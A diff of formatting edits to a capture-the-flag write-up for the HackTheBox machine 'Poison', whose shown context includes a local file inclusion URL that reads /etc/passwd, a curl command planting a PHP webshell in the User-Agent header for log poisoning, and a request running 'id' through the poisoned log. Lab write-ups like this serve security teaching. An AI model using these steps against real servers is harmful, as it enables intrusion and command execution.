@@ -196,7 +196,7 @@ uid=1001(charix) gid=1001(charix) groups=1001(charix)
 
 <br />
 
-If we take a closer look at the URL that gave us access to the base64-encoded password, it appears to be a good candidate for testing LFI (Local File Inclusion).
+If we take a closer look at the URL that gave us access to the base64-encoded password, it appears to be a good candidate for testing LFI (`Local File Inclusion`).
 
 <br />
 
@@ -221,7 +221,7 @@ view-source:http://10.10.10.84/browse.php?file=/etc/passwd
 
 We are able to successfully retrieve its contents.
 
-<br / >
+<br />
 
 ## Log Poisoning
 
@@ -235,7 +235,7 @@ We will exploit this step by step:
 
 <br />
 
-### 1 - Locate the server's log file (apache2)
+### 1 - Locate the server's log file (apache2).
 
 <br />
 
@@ -252,11 +252,13 @@ view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log
 
 <br />
 
-### 2 - Send a curl request that injects a PHP webshell into the User-Agent header
+### 2 - Send a curl request that injects a PHP webshell into the User-Agent header.
 
 <br />
 
 This is the PHP code that we'll use for the webshell:
+
+<br />
 
 ```php
 <?php 
@@ -276,7 +278,7 @@ curl -s -X GET "http://10.10.10.84/" -H 'User-Agent: <?php system($_GET[100]); ?
 
 <br />
 
-### 3 - Use LFI to include the log file and run a command
+### 3 - Use LFI to include the log file and run a command.
 
 <br />
 
@@ -289,10 +291,13 @@ view-source:http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&100=id
 ```
 ![9](../../../assets/images/Poison/9.png)
 
+<br />
+
+As we can see, the command was successfully executed.
 
 <br />
 
-### 4 - Reverse shell
+### 4 - Reverse shell.
 
 <br />
 
